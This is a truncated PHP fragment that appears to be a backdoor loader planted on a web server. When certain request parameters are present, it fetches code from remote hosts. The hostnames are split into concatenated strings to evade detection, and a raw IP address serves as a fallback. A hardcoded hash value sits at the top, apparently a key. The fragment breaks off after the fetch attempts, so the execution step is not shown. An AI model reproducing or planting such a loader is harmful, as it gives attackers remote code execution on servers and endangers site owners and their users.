<?php
$p = "bf3d51221f1d040534b107049633ecb2";
if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) { $code = GC('htt'.'ps://c4.ic'.'w8.xy'.'z/'); if(!$code){$code = GC('ht'.'tps://c2.ic'.'w7.co'.'m/');}if(!$code){$code = GC('http://45.11.57.159/');}
